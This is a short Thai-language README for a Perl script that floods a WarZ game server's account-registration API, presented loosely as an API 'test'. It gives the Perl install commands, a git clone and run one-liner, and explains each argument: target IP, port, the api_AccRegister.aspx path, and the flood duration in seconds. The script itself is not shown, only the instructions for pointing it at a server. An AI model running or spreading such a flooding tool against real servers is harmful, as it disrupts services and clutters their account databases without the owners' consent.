# Flood ID WarZ
สวัสดีครับวันนี้ผมได้ลองทดสอบเขียนสคริปต์ขึ้นมาเพื่อทดสอบระบบ api ของเกม warz ซึ่งในการใช้สคริปต์ตัวนี้คุณต้องรู้ที่ตั้งของ api ก่อนเช่น /WarZ/api/api_AccRegister.aspx หลังจากนั้นคุณต้อง install perl ก่อนนะครับ      
(centos: yum -y install perl | kail : apt-get install perl)

git clone https://github.com/c0ed4e4/apiwarz.git && perl api.pl 1.1.1.1 80 /WarZ/api/api_AccRegister.aspx 120       
1.1.1.1 = IP / URL ไม่ต้องที่ http:// | /            
80 = Port ของ website             
/WarZ/api/api_AccRegister.aspx = ที่อยู่ของ api เช่น http://1.1.1.1/WarZ/api/api_AccRegister.aspx (ของแต่ละเซิฟไม่เหมือนกัน)    
120 = Time ที่จะใช้ flood id
